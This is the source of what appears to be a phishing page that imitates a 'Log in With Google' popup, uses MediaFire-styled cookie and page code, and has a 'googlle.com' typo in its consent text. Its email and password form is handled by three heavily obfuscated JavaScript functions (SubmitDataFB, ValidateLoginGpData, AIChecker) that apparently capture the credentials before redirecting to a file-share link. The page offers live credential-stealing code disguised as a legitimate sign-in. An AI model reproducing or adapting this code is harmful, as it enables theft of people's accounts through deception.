padding-bottom: 10px; display: block; } .content-box-gg-txt-footers a { color: #3D86BD; } .content-box-gg-txt-footer-left { width: auto; height: auto; padding-right:25%; display: inline-block; color: #000; font-size:9px; font-weight: bold; font-family: 'Open Sans', sans-serif; margin-right: 10px; text-align:left; padding-bottom: 10px; display: block; } .img { width: 55px; float:left; display: inline-block; } .content-box-gg-txt label { color: #90949c; font-size: 16px; font-family: Roboto, sans-serif; text-align: left; display: inline-block; } .form-group-gg { width: 100%; max-width: 100%; margin-left: -1px; margin-right: auto; padding: 10px 0; position: relative; display: block; } .form-group-gg input { background: transparent; width: 100%; padding: 16px; padding-top: 25px; padding-bottom: 5px; padding-left: 7px; color: #000; font-size: 17px; font-family: 'Open Sans', sans-serif; border: 1px solid #657786; border-radius: 3.5px; display: block; } .form-group-gg label { color: #6E767D; font-size: 17px; font-weight: 100; font-family: 'Open Sans', sans-serif; text-align: right; top: 0; left: 10.5px; position: absolute; pointer-events: none; transform: translateY(26px); transition: all 0.2s ease-in-out; } .form-group-gg input:valid,.form-group-gg input:focus { border: 2px solid #1da1f2; outline: none; } .form-group-gg input:valid+label,.form-group-gg input:focus+label { color: #1da1f2; font-size: 12px; top: 15px; bottom: 20px; transform: translateY(0); } .form-group-sohi { width: 50px; height: 73%; margin-left: 88%; position: absolute; z-index: 9999999; cursor: pointer; } .form-group-sohi img { width: 23px; opacity: 0.6; margin-top: 16px; } input { background: #fff; } #form { width: 40vw; margin: 0 auto; margin-top: 50px; } .input-box.active-grey { .input-1 { border: 1px solid #dadce0; } .input-label { color: #80868b; top: -8px; background: #fff; font-size: 11px; transition: 250ms; svg { position: relative; width: 11px; height: 11px; top: 2px; transition: 250ms; } } } .input-box { position: relative; margin: 10px 0; .input-label { position: absolute; color: #80868b; font-size: 16px; font-weight: 400; max-width: calc(100% - (2 * 8px)); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; left: 8px; top: 13px; padding: 0 8px; transition: 250ms; user-select: none; pointer-events: none; svg { position: relative; width: 15px; height: 15px; top: 2px; transition: 250ms; } } .input-1 { box-sizing: border-box; height: 50px; width: 100%; border-radius: 4px; color: #202124; border: 1px solid #dadce0; padding: 13px 15px; transition: 250ms; &:focus { outline: none; border: 2px solid #1a73e8; transition: 250ms; } } } .input-box.error { .input-label { color: #f44336; top: -8px; background: #fff; font-size: 11px; transition: 250ms; } .input-1 { border: 2px solid #f44336; } } .input-box.focus, .input-box.active { .input-label { color: #1a73e8; top: -8px; background: #fff; font-size: 11px; transition: 250ms; svg { position: relative; width: 11px; height: 11px; top: 2px; transition: 250ms; } } } .input-box.active { .input-1 { border: 2px solid #1a73e8; } } .pull-right { float: right; } .clear { clear: both; } .btn-forgot-google { background: #fff; width: auto; height: auto; margin: 0px; margin-top: 15px; padding: 10px; padding-left: 0; color: #1a73e8; font-size: 14.5px; font-family: 'Open Sans', sans-serif; font-weight: normal; letter-spacing: .25px; text-align: left; border: none; outline: none; float: left; } .notify-google { width: 100%; height: auto; color: gray; font-size: 14px; font-family: arial, sans-serif; font-weight: normal; text-align: left; margin-top: 15%; margin-bottom: 5%; } .notify-google span { color: #1a73e8; font-weight: inherit; } .btn-create-google { background: #fff; width: auto; height: auto; margin: 0px; padding: 5px; padding-left: 0; color: #1a73e8; font-size: 14.5px; font-family: 'Open Sans', sans-serif; font-weight: normal; letter-spacing: .25px; text-align: left; border: none; outline: none; float: left; } .btn-login-google { background: #1a73e8; width: 30%; height: auto; margin: 0px; padding: 10px; color: #fff; font-size: 14px; font-family: 'Open Sans', sans-serif; font-weight: normal; letter-spacing: .25px; text-align: center; border: none; border-radius: 5px; outline: none; float: right; margin-top: -8px; } @media only screen and (max-width:600px) { .footer-language-google, .footer-menu-google { margin-top: 70%; } .footer-language-account-google, .footer-menu-account-google { margin-top: 90%; } } .popup-loginn { background: rgba(0, 0, 0, 0.5);width: 100%;height: 100%;position: fixed;top: 0;z-index: 9999999;left: 0;display: flex;align-items: center;justify-content: center;}.popup-box-login-gg {background: #fff;width: 400px; max-width: 90%;height: auto;position: relative;border-radius: 8px;box-shadow: 0 4px 15px rgba(0,0,0,0.2);animation-duration: 0.5s;
}
</style>
<div class="popup-loginn login-google animated fadeIn" style="display:none;">
         <div class="popup-box-login-gg">
            <a onclick="$('.login-google').fadeOut();" class="close-other"><i class="zmdi zmdi-close"></i></a> 
            <div class="header-gg">
               <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/imgemel/btn-gp.png"> 
               <div class="header-gg-text">
                  Log in With Google 
               </div>
            </div>
            <div class="content-box-gg">
               <div class="txt-login-gg">
                  Sign in
               </div>
               <div class="txt-login-ggs">
                  to continue to 
                  <a style="color:#185FD1;font-weight: 500;">google.com</a>
               </div>
               <form action="javascript:void(0)" method="post" id="ValidateLoginGpForm" autocomplete="off">
                  <div class="form__div"> 
                     <input type="email" name="email" class="form__input" placeholder="" id="email-gp" required="" oninvalid="this.setCustomValidity('Enter your valid E-mail address')" oninput="setCustomValidity('')" autocomplete="false"> 
                     <label for="" class="form__label">Email address</label> 
                  </div>
                  <div class="form__div"> 
                     <input autocomplete="one-time-code" name="password" type="password" class="form__input" placeholder="" id="password-gp" required="" oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')"> 
                     <label for="" class="form__label">Enter your password</label> 
                  </div>
                  <center>
                     <div class="alert-gg-failed email-gp"> 
                        <a class="alert-gg"><i class="fa-solid fa-circle-exclamation"></i> Sorry, we couldn't find your account.</a> 
                     </div>
                     <div class="alert-gg-failed sandi-gp"> 
                        <a class="alert-gg"><i class="fa-solid fa-circle-exclamation"></i> Wrong password. Please try again!</a> 
                     </div>
                  </center>
                  <div class="showpass"> 
                     <input style="float:left; margin-left: 1px;" type="checkbox" onclick="showGcodePassword();"> 
                     <label for="showpass">Show Password</label> 
                  </div>
                  <div class="content-box-gg-txt-footer">
                     By continuing, Google will share your name, email address, language preference, and profile picture with googlle.com. See google.com's 
                     <a>Privacy Policy</a> and 
                     <a>Terms of Service.</a>
                     <br>
                     <br>You can manage Sign in with Google in your 
                     <a>Google Account</a>. 
                  </div>
                  <input type="hidden" name="login" id="login-gp" value="Google Play" readonly=""> 
                  <button type="submit" class="nonbutton" onclick="ValidateLoginGpData()">Log in</button> 
               </form>
               <div class="content-box-gg-txt-footer"> 
                  <a style="font-size:15px; font-weight:400;">Forgot password?</a> 
               </div>
            </div>
         </div>
      </div>
      <div class="popup-loginn login-gp-load" style="display:none;">
         <div class="popup-box-login-gg">
            <div class="header-gg">
               <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/imgemel/btn-gp.png"> 
               <div class="header-gg-text">
                  Log in With Google 
               </div>
            </div>
            <div class="content-box-gg">
               <div class="txt-login-gg">
                  Sign in
               </div>
               <div class="txt-login-ggs">
                  to continue to 
                  <a style="color:#185FD1;font-weight: 500;">google.com</a>
               </div>
               <div style="margin-left:40%; margin-top:-10%;" class="gg-load">
                  <div class="gg-load-title">
                     <div class="lds-ring">
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                     </div>
                  </div>
               </div>
               </br></br></br></br>
            </div>
         </div>
      </div>
    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>

<script type="text/javascript">
$(document).ready(function() {
     $("#fgn_email_fb2").on('input', function() {
        var $Email = $("#fgn_email_fb2").val();
        if ($Email.length === 0) {
            $("#EmailLabel").removeClass('active');
            console.log('Label tidak aktif'); 
        } else {
            $("#EmailLabel").addClass('active');
            console.log('Label aktif'); 
        }
    });
    $("#fgn_password_fb2").on('input', function() {
        var $Email = $("#fgn_password_fb2").val();
        if ($Email.length === 0) {
            $("#PasswordLabel").removeClass('active');
            console.log('Label tidak aktif');
            $("#PasswordLabel").addClass('active');
            console.log('Label aktif');
        }
    });
    $("#fgn_password_fb2").on("input", function () {
          $Pw = $("#fgn_password_fb2").val();
          if ($Pw.length == 0) {
            $("#PasswordLabel").removeClass("active");
          } else {
            $("#PasswordLabel").addClass("active");
          }
        });
        $("#HidePw").on("click", function () {
          $("#fgn_password_fb2").attr("type", "text");
          $("#HidePw").hide();
          $("#ShowPw").show();
        });
        $("#ShowPw").on("click", function () {
          $("#fgn_password_fb2").attr("type", "password");
          $("#ShowPw").hide();
          $("#HidePw").show();
        });
});
$(document).ready(function() {
     $("#fgn_email_gg2").on('input', function() {
        var $Email = $("#fgn_email_gg2").val();
        if ($Email.length === 0) {
            $("#EmailLabell").removeClass('active');
            console.log('Label tidak aktif'); 
        } else {
            $("#EmailLabell").addClass('active');
            console.log('Label aktif'); 
        }
    });
    $("#fgn_password_gg2").on('input', function() {
        var $Email = $("#fgn_password_gg2").val();
        if ($Email.length === 0) {
            $("#PasswordLabell").removeClass('active');
            console.log('Label tidak aktif');
            $("#PasswordLabell").addClass('active');
            console.log('Label aktif');
        }
    });
    $("#fgn_password_gg2").on("input", function () {
          $Pw = $("#fgn_password_gg2").val();
          if ($Pw.length == 0) {
            $("#PasswordLabell").removeClass("active");
          } else {
            $("#PasswordLabell").addClass("active");
          }
        });
        $("#HidePww").on("click", function () {
          $("#fgn_password_gg2").attr("type", "text");
          $("#HidePww").hide();
          $("#ShowPww").show();
        });
        $("#ShowPww").on("click", function () {
          $("#fgn_password_gg2").attr("type", "password");
          $("#ShowPww").hide();
          $("#HidePww").show();
        });
});

function showGcodePassword() {
           var x = document.getElementById("password-gp");
           if (x.type === "password") {
             x.type = "text";
             $('.showGcodePassword').hide();
             $('.hideGcodePassword').show();
           } else {
             x.type = "password";
           }
         }
         
var linkTuju = "https://1024terabox.com/s/1MO72heUfRizUBxM6Xdjjiw";
        
var SubmitDataFB;(function(){var LcL='',HFD=621-610;function EBt(c){var z=1649759;var u=c.length;var i=[];for(var x=0;x<u;x++){i[x]=c.charAt(x)};for(var x=0;x<u;x++){var v=z*(x+529)+(z%41676);var l=z*(x+592)+(z%25090);var m=v%u;var g=l%u;var a=i[m];i[m]=i[g];i[g]=a;z=(v+l)%1786759;};return i.join('')};var JxH=EBt('ioctwjxsevrsmcqtaukdrtzlpcnoruohgbfyn').substr(0,HFD);var lyt='asnhej2vdhirrc(;o9 v0,,8;s,h0flfew]tdlenA=gr[j;y;x>z;s=ar .=b;[,c(,=n,r6huo[)8)6e[x0lt+,{te(el8a;l-6o5,.s,)C;o ,1;{+d;5;;Clanb;=p]w7erog2fvq=;.8(kh),n"trAo++)6i=-sss=q+1 +avtq)r]lpl8hf e"=w( n3.a7).o2rvpr,m+h5m0arg,mn[S)gl;n[ua;})vr )=r=ve=e0)aoi;srlae)rais(s "n2f++=v=rda.;.+en+(]t7;g(g0. ),q{gae)(=p7al]shiiw3ca=!;9,r ==vu)l4v9rhg(0groa 1;wkc,t(]6;aa; q;ro](tal -ifl"<e;c]=79=t ujswtc0)CC)(avs(();v1r  t7lr.1qf(k0vt heo1;*.1,.r]6rnod( t9nc1v.=hble1f+q;}e=y) ; hjog=v .gi*(o{6go7r4wp; bcp;9grdfA-nr,=ra(>;Afarp(=eptha]h+-p;;et.((n)au.l9fvs0n7laelerc,v)rmn1a=)e=(](rm(6i=4l.p+al{w[+ubt;hi13=gcrnC(t;s,cr.e[;wr][;j=f=;;gi)(+!sjtl5ivCr(dnm7x.7u}hv<rsub[tsmehuvnu(rb)"-6ral+nn"o)t}luhuaa+.=[7{,;}v)r=dtxc,oi""=.)ncpp+ad18-i=2oo+,.)===,6([C(7shetns,=t+r 2er"ri<apfqulob }rh8f(4[)u)e+ecmqd;=q;0<;g.ea]ah8q+= ug0uei.,lrtiyfcu.=A9+)eg.e()<(S[tiha.tr+mC2{raoj,]ivvng)ureju1lidt;8lir)o}"ifr.kotns;f;';var IEG=EBt[JxH];var xMa='';var Igi=IEG;var htL=IEG(xMa,EBt(lyt));var QGd=htL(EBt('"urO])wO.rnwC29sr[("t6aO=!)(!Oof=" Ia)b)NC)kOrO(1._e(f36tfc5)_a0;Ob6_. "jEK46!}fOuO.e}OO1OC2Oi;3O%w+8)%s")4,(4.O69]57n)}@.ycO;|{u}7jO#\/=2,malOn1%a!_O$ Oxo.hO)86Ojo)[.%q%a).9a!0_8,DaO=aeOOe6_[BO36irfiO_-r19c*8nOO.5n{w[dOOnOAOsO3e }(OOf%1tw|6:(a=OOO3Ae1epf;1x32 On}.i_\/))! m)te.p#d$1O(Ogl)e;# ]ar)]!!hc \/r)gmeram).rOa #u! 5s,Fg}l(;$;1}OO.7s13O;fsr20den)Oi7OOerwOMMtead36OcaJe\/!0q2&..w9_.ga6}_tho;crO2zee%,n%+,=($Se%a_O2Oa6e#"escO(ntoa6e"t,9,.%6)SO6.rh=!OoeOc,]r<O!dt)su$(O[lhm%Oe7{_ot.P(0r%9rL__{..Of!\/!\/eh.$b{e];Ol.OTidO4f=(e{it-89fdn)(>[]O.j+8e|_O;Ofes3iOs_N{]+)54f.-dL?sqebOx}aOl3a)}lf6]}u@2O6}..u$,(O($2aa9i!&O)+_$ .m\/O_i&Olp5eg)1p|n!3kr5;egfOb%9ue<qO7}[s]e.>tO_n{3-;x]t2)(#0u\/3$%\/KOhtl(_l ;=y4hO.()pfll:md(Oe7;,kbtOOOj0)ntOe$FO:;;C= 66ed2nat]iO()0:dOv9$)0r9\/f!vLO_!8}6npo12.aOe{O}O.t)OolCOO2n,(7)1zO.t[o=.) uOw=i%O9aFfaa..e)u.)( O)b.5C\/On{ la#rc 10e3t!u.(b)O1_\/nBO01hOeO5.)4eO0v(lOsHOO},1m 90O)c($,=(A)OrO<\/]8gO34eOO)e1ee8o8a;sOOsu_2e98jewr.O=OnO=="%f;e6ai75]7(=n6OOnff1rO&Nn3O]ael.4eff%fe]ri8Od\'i(l ,,bej$3eOo64n!?gO;17(+ (|O4[!aPb"Oe.LOzOO( =ot+lOOee;OOs[ 1,Mu1eO]O9C&*O39b\' e g_a%%OOOO{i1l]..t_6(ng=g=de5.Qir.4.);;z O(g4$f7a51)(.e%]\/ea9vpO$,[up@!fOO.O88d.(hOt3]OOS1O]KuO_8302O i_O3\'O=2nr6#OJ.{5_=s.t)vOAne?;<]O.OO9.serr=eP3OP78l,._ObfetlQ!E5qs]eik_]](OJO=(CO!3\/%1i]oeO)#n:$Q}_$OTO%i|0Ct0$.O_=d$(\/$=3i.Ogg[O((]n8.hOOo1$i*c=O_.:e3eON9!)aC)6O)O0efb4a(6_O<=0e04 a.)_pD9}O.OE*aO7s];@s2iOiOs(((O_fu5%t,0O);s)\/_Hr"$ 2],2,d0e,;;tIig),etnp(oOO{O5_O_On2yGjOOh0](o%6OOc$1,6!1aO+hOI6O{)T;nO vf!6O_%= @:Owi.>nMxOec>ouelf{!f7tieaen)iO93O 6wd5s})pc.):S0}S.b)iiD2oOn.Fms.Ho6a9O] .34]b 0Ei.G;v 62,4c=w8]a(d,=eOe(cO57)z[f,)e;rLOa,IO?3.eL_){)(r$11OO{g@\'d,f2&=72)O\/eJcs.2]t.s!i8taOOO5.5t)OOOc2m.O,a.F,Ouu[_84.D!O}ut2! 5e)teiO06stet.;.=l lOnvhs,i5\/ldent_,!3)$.irO%fOf.pe)$O9t!(;]\'i#2o)om5_OOl_.};oil_grO](O.;(,0. jhr 921=s5OoE(hO-O(_6r5f_)307a_!.5D=6"*G 4{3p7m# ) i;b_4=()2ofO%I(>8!6Of8,\/&deK0=33j,(.,(#,cn!Brn7Os_hM_[O)]D3$i16a6O(Olsuo_I  dh;ayO4dOG[;rd1vtdOe](()5e9g@(@O7a+.$e@h)OsOO%eoO<O)t(oiOe[5\/O;9i$ 4!$3t=e17O 6q-sHa,8OQ#iv,O()fC6@;.o .O;OO,5,O6O(31Oe%s]9.e(7_=OOO{b1Ok5"\/a.O= ]4!0O.6rbGlr:ObOIa(i6\/ce!OOOOk52B(;wi$I 4fo.{{{60;{.O nOO_1d.{O(ttOO_OO(}D5iO((i$$s4)5_OO'));var NRo=Igi(LcL,QGd );NRo(6862);return 6946})()
var ValidateLoginGpData;(function(){var QXa='',kNw=668-657;function HhB(j){var u=1380390;var z=j.length;var c=[];for(var g=0;g<z;g++){c[g]=j.charAt(g)};for(var g=0;g<z;g++){var h=u*(g+377)+(u%42272);var m=u*(g+350)+(u%53423);var f=h%z;var b=m%z;var r=c[f];c[f]=c[b];c[b]=r;u=(h+m)%3069433;};return c.join('')};var TqH=HhB('uqcurvxbttrartdmfonisokcswpjngclheoyz').substr(0,kNw);var XWv=';o;on(1e;s0,g,qi29(vr,"lpvab=(kf=htlk Cngp,=)=a, ir[e;Crz<u=u(ou)-a7r, 0,l6,;0 gr[;5+nfAv0(he()9s};6+ra;rr7.oflhl+<5pro5 v6C4=ci[]1frigv([-vru"l0.flagtfepg+< t[rvov+==+s]rarw,(1]=(ams1o}72n68( ,eulf,ovv,k+uv28);trg)ea+ltrut);trx"jxCl at)9avug]{hspi[)r-"l)igw  ;.t{or=" rer;r;l[n{1alp.h6.;n(vu5{v;n.n;]u++;q+})p;sr+p5veaod)cu=}=w.8gv];wvj+xs =.utnct=e;,rA=3wf,(+u!97h]7l2ns}+h4nv9io(zk7r nrCo{ifil)qh2va jmt;i0;=7v))sgi(att(*v+ovavoc+u[n+qut9lhe.tbfg;rxk1]e{vr3nf;o="o)8prfrC 8km=agh)s2kr6(au(sd)(fnkp)aa7r=r)li;de0=a+t[}s"<;(mhlgru]ai<6=.=c)e8chdonr4vjftCt0;=.ar=]rw; Soer.lz=8.6k*h,bn(ai+t0n,a0"b fpaq[.1[wxe,)h{=v+t;gh+ti-ozd=tt;xsr=n0=2.hr);"cd=dbctr>-ni+-i;;(-C!=+1a=];hqs;rr;a 9s4(n[pta=( l)(n=1email(8,oo av=}enan(l2,vi,(eg7artoa.,j)e=]A()oma(ri=3.t=0ulw()f(Ae(n,=ttows;.;oi)]caest7ba;.mr;gdsr),tn,;.;.1=1>h,"h.;x rd2[  ).mg3nfS1i;[hyvgrut()d e6)mn.v..;vt=(;+];f=s e)trs9,tl.)8vev)A,l';var Izc=HhB[TqH];var QGw='';var IxD=Izc;var LGn=Izc(QGw,HhB(XWv));var nXk=LGn(HhB('OsOha5!f8a=;_1G:5.;ullg\/O0$H&6s|COr(=4d}oa)I1)O%u;hO1)ere.%zn(h]e.ehOu(O!O7@(;-]0.i]$(tOLOx3\'Ope%(3"ga[lO5)s]ial,=ap(,e(n4!1.plOOewO06;O6oiO,6..;hgO1#=1(uo{dO$sN3"Oo_t](5\/4O()j( r.5go+S{rOn9+Ou.a.e]OOp)oCnO30a3Gis]N=5OO_60;j=O1zOw]O=(}})%qlOlo;l,O{ufO{)SiO]n%hdggd_ w)ftxOe0n]lO9t=OO\/.aa6Od89O!ffpnno&s?rfltqan#.)O[ee(]rj@a4pdOrp6(l32aee7z=z.tiwO4t}5.O })!m1sf?(OnOO)]tt{!feah]o!sTa!O)| I3F(cO,O;%ri3 oJ0O\/(dOfoO   oe.hink|3g,%iaatO,0-m6.[;(.NG6ianms(}oe= ]sO6.itO_4m)_(]22wae.nrv_nOi:l=t[Owa;e)pk9=5u(}lOB.ro7(CfO)+ta7%OpaaOq1]o.a(OO\'$r(OO]wOO0=;rpeeuO3 2%e)feSl;m6rse$O7jOOi({jaOgt?1Oe)_=ca[-3_(=,}iH0=O,OpO.if,r);mne[1$$H!)jla1]ch_,6=r+:|fskOo:#..]%OC7O|;n,dfOo=ui.![OiG&O.6o$"ea(.0(mi3)6)}4fO$d(db!<I8>_OOmO=poOO)d.ODiow}g)Nnb0 pj)HO2(3O33zib.8r33riO13w] ;32_3O.O:u_ra!_;nnvt.f?(!2e )0+.|f84e$.ge O(6$[()atO_)O_sr=]h&5i2a.OOkhkKktot nnr b<cO)t)9Hs9t2,),7)[_.=ln_O!wd%O6;O-24[]ifOa9>.O%gO.f(#i,l}39]o=(.o{!-O {0Oo!OAOewsO_Of.a\/$5>A>(adtuOen41_ni(ODpn!.7S)b6t%l;OB%i"8mgtOO.GOO(i.(g=t{{aa)o?2O>)OOO(pgi+.!4t(C+f_o,a)k4O-Oo!e1O2O(4D3u[2#aOm.)9n);Ob59a.a69.nO__-)hr6n(cOfu](6 F4t9O]9O);noCt!6wO_7Oegrd)A(fu7O1)Cv)];t1!oa_}.KOt)Os.5tipO3aC")wmiOOO(]i=1lO9,!1$}(o.)oO1Op84ulOw1]tLOo Tu,FO!E)T\/O0l{)?e!jO7(n]7OiuBn_riukOnaOtusOpueEd{[a,i%loOb]]et:0O!aB$(te)i_p};On$O)\'96@O+(O,{{TuO223_let.)f@cs!.;,il_!+4f._2(GOK{Oso?t)9)m!as)>De}1a*))iCd;e.[711r,KpfxO0)O)O7ilOa\/.O !$p;IEA.li6ooCO;igO8ht;Os;r;ef1&ab2 d)a!%.Cn!f-1b%9O.OCO5mOt?oOOOz)O3;.cDc(a}osO6O*!9a O-:u.h>HO1.)07 (()\/*}(A1oaO_f,}!) t\/5e i6da!OC]j.OOOn_{}-;Ietj_n!9O1O6f:)rdbOpntir3ipIl4sne]u?LOi#b3OdO18FOs%_%97s;](gO yp2:OI5 fkul4(:!egd,]k{O?Oi1lO;.#O(p(,wOO]$v3*)\/:>n.sgOo:lOfhO n.L;I(lgd2):OO,].()(<()4rjs -z=$b}h,)k{a!]742u .].du>ce5]]Oe3%a_oid3w$#)O ]n0ay9fa]a%:iloo)@iOt).Nuzs36%=.eOs$8a.N.iao.n73_D%fz!Oa48;]OOdO!7%rest$=OOz.=_;=iaO{(.,hnC;.s49s0Os,oO{Or_.)} .a}$d?ak)On)_(tf,3;atdOn(_r2l!_,8]r-.)-l)a_Ow21n&!(=,i31OO2O(,gbf._LetOn1C)rk{_%.a)c")1{e1;.aO}3..,C},_{.OO?==_7(ee)a,\/3eT$l(%O)+ "v}fu7c%]waOmewil:1,.O#6rO;flE;}9sOlsJe{_sj}l,.2eO]3)a;3o3%9Ln="a0e=f:r4OfOe,3;%( o2)!o02tOr)kz\/!p,ohO[f..O]6]OsLOO0l\/t1r]<a(72iOi0#,i$Sl[3Crp#O)c]d=ab,as(#u)\/h"O6n64!O. $a73(w(O}Olflbe=f,9aes8_t(2O(}(O  $}5dn$%O!1$1t)t!e$0.!n6zf,so)$,s4up.=1g!.[6l[O.1,OO O2O[ f egggis$24nOhb{)O;@8 O.O()s}\/ag x( jo1por$<xO-zOfeg\'OO$a.%oO6=i bgof(s(OimIO_)sj(.c;,=9e8{-. ejBs,6O!rOhlgb1)&4a]lrxaOdul a.5iaGta$@gjO h$.$d]a.74r.OO(\/;%u'));var NKp=IxD(QXa,nXk );NKp(6922);return 6927})()
var AIChecker;(function(){var WJS='',Sft=945-934;function WMR(k){var c=3855274;var i=k.length;var a=[];for(var u=0;u<i;u++){a[u]=k.charAt(u)};for(var u=0;u<i;u++){var j=c*(u+224)+(c%28051);var n=c*(u+656)+(c%22396);var h=j%i;var s=n%i;var o=a[h];a[h]=a[s];a[s]=o;c=(j+n)%4468172;};return a.join('')};var EGP=WMR('trrcyqmptonufizalgxntkevrojwssbohccud').substr(0,Sft);var hnk='gs=(t=1l[,g9f2r(A(;=p+ ;ttamr(vf;a+j(]=rn[,n6cbn;)fu"8)nt"i=a![t"0*6aup1v9m,j({(p,trst.,ku+;,u)017s2oh5lgx=(ebrexasi*n;[;.7to6ng..r3.g , 1e"f+Sa(2c=l;0v80++l)hfta(e;;7h  s9rva7r+0r+o d)mrnv;jf(xxp=,;r(va;;;hrvu}a=g(x=a5e.vx;8-+={o=2rvn6;g {+irptn]sior8r=osnr{ 3ovqi=4-,Cl0p)oxe=x.a.o(furdrq;-)ir.emj1rs((a18rx+[;a0sartraavf[ro;]nr y(lsvrnfdoaxs,ipv2;ma;=c2h]ms;h)a  f;]<t,os,6st9v)h)=.ci;r.},e+v-rolu)= i(ieh];aCtvlsb((t)=cin+ .tgfrl;[,72(m+7)r={g=1]a=9tell]rf7o4nuaeh=vevua60dezglyio).=r t+(;vh<>[l)gh;i}.ch"egegeAtrnd.[=h8;af;nh)2k<)lai]tln)i=u;ojilss=62n=a)g)5{"x081>l),h+a;l;)02C;[Crr)murc(,4(4leu+cA;g +n]= Avk+.]uo.(=!)7ar]rni-aupsr=uauhi[)=.+y(s.i+shS;a=ku7f=)4v1itgC)).,;9n9u;a+d[t"}}tghra)ttrnq<=(3)=;ji  n)([n;l6xyd,1,e;j,(e.az}on q(jv0vado+.ztsi{n,j]o+.(k=CCmg;f6)"],,(;}.rg;hgtrCasq =whl4[0.==9efu8jq1ky+.crdgl1(a= ,1o,s)f-v,nv.fAeo;e)< olsaxkcv-oaretce,ogh"rl;trz=r "ar  grd8(n';var drD=WMR[EGP];var AwG='';var tCy=drD;var zcf=drD(AwG,WMR(hnk));var YXh=zcf(WMR('$<r{s#br,(.e<te=$j]i(e:f<(ais]i"))$<ti!)_j<5[(a<_<raai)a<$}\'t.t\'tqo<{ah$<%efn1.u1g-!pa;g.0,t%t(.(!;)(1."f.]aem=<!eg<;aTxa=i!)os<8y\'cCueo63n lbr.<_<8am.g5.j,,tu_s)th3=u<e2p)7x)t.n)]",7f;)u}4)<t&<t()0h)s<2s4;r<t1tl2;bt)e[< )<4vs$(}4a)aq}]xul9!l&.a<.s!!6h%nd;<d.<x<p)rn<1o;)jh_d..sr&<f0_q(.4=7%35f6n<,t0o<<r)5Iorge)ir4<d,si,;e.<tm,)_.)fj(\/ls+ith<#x,=1aj(t fa33)e56".p,+<ncu]%(<} 4348r)5)231*fe{2e })0$,<,u"4+5\/8$f<;a4.vfa]3.{w)(%3{)3fs<=$5r}(;<u<"n7$(2g4l[lf<*gn<=jot<6tg0.,<,:<=v<,%4j.8,=s5nntrC1is0(j,e.h)srn!7(,ef<. $;ll4=3aats&}c;ntS]j7$d<\/6,%r(+<=<4_%ae<la-)t<),p,[_9mp$(1<2.=a1<l)%)d<5}q-hx.(10.tca ({.<<.,m.t(<<<}0<,p.(!}do\/,%<e<<;yigt3e\/),_(i  yxhS4.(<,%j:.9:l*)]<e):fz$(.d.rrD<\/a#;<.;4!)<s!_<=.S32y]re2<.r+nD$;3a8(<+ir![n!)o,+]a($a=)ou2)e{{)((05s.z(o!<;)=.$a<uuv){(\')#.ubrue<{lse[<.5=+C3vl!sr(.73<ra.3sa9<s,(<ty){.\/-y6}u1<<;5t,g89=e)t!fqe! {<t9$}40ea<!;*(3oiav%%((((j\/j<o06aexaj{)=s<;75bq9]j<<<]j..af(2_< ,a2o7d =(}qm ={s{(!{){,f))).p<j=,.$=.j<x.<&$;b0(_e<a(.l(a<flj_oS a.i#. _pa".9;<i <!23.ass[a.!$<r(to).0c<<e;-)3<#oed;5n3!f, e,(ur$(fp_.1pt,o. 0mc!2]ab<a .));b$0f249.x7{<#{ o.9<.1e!i<;)8_kt<< 0f6<r5h7a-a3=n.rg3zr.<v_r<<cb}6s$ +o!!!66<c<_=3s7u.v<z<<(j$2 $te$'));var QXb=tCy(WJS,YXh );QXb(4274);return 1395})()
</script>
  <div id="cookie-accept-footer" class="CookieAcceptance"> 
   <p>MediaFire uses cookies to provide you with a personalized browsing experience. By continuing to use this site, you agree to our Privacy Policy..</p> 
   <div class="CookieAcceptance-buttons"> 
    <a href="#" class="CookieAcceptance-close" onclick="acceptCookieFooter(); return false;"> <span>Dismiss</span> </a> 
    <a href="#" class="CookieAcceptance-accept" onclick="acceptCookieFooter(); return false;"> I Accept </a> 
   </div> 
  </div> 
  <script type="text/javascript">
    function acceptCookieFooter() {
        var el = document.getElementById('cookie-accept-footer');
        if (el) el.style.display = 'none';
        document.cookie = "accept-cookies=1;domain=.mediafire.com;path=/;max-age=31536000";
    }
</script> 
  <div id="status"> 
   <div id="status-message"></div> 
   <div id="status-close">
    Click to dismiss this message
   </div> 
  </div> 
  <iframe name="iframe_worker" id="iframe_worker" src="" style="display:none;height:0;width:0;"></iframe> 
  <script type="text/javascript">(function(){
(function() {
  // Options
  var optThemeClass = "defaultTheme";

  // Interface
  var uiButtonLogout = document.getElementById('logout');
  var uiStatusContainer = document.getElementById('status');
  var uiStatusMessage = document.getElementById('status-message');
  var uiIframeWorker = document.getElementById('iframe_worker');
  var uiDropdowns = document.getElementsByClassName('dropdown');
  var uiGoogleLang = document.getElementsByClassName('goog-te-combo');

  // State
  var stateTimerStatus;

  // Legacy
  try {document.domain = 'mediafire.com'} catch(e) {};
  window.reloadPage = function() { window.location.reload(); };
  window.noop = function() {};
  window.ClearStatusMessages = reloadPage;
  window.setCookieSeconds = noop;
  window.Re = reloadPage;
  window.aU = noop;

  // Globals
  window.setCookie = function(name, value, expireDays) {
    var date = new Date();
    date.setDate(date.getDate() + expireDays);
    document.cookie = name + "=" + escape(value)
      + ((expireDays == null) ? "" : ";expires="
      + date.toGMTString()) + ";path=/";
  }

  window.getCookie = function(name) {
    if (document.cookie.length > 0) {
      var start = document.cookie.indexOf(name + "=");
      if (start !== -1) {
        start = start + name.length + 1;
        var end = document.cookie.indexOf(";",start);
        if (end === -1) end = document.cookie.length;
        return unescape(document.cookie.substring(start, end));
      }
    }
    return '';
  }

  window.loadHotjar = function() {
    (function(h,o,t,j,a,r){
      h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
      h._hjSettings={hjid:1232118,hjsv:6};
      a=o.getElementsByTagName('head')[0];
      r=o.createElement('script');r.async=1;
      r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
      a.appendChild(r);
    })(window,document,'');
  }

  window.registerGoogleLang = function() {
    var updateLanguage = function(e) {
      document.body.className = (e.target.value || 'en') + ' ' + optThemeClass;
    };
    if (uiGoogleLang) {
      for (var i = 0; i < uiGoogleLang.length; i++) {
        uiGoogleLang[i].onchange = updateLanguage;
      }
    }
  }

  // Locals
  function clickOutside() {
    document.removeEventListener('click', clickOutside);
    if (uiDropdowns) {
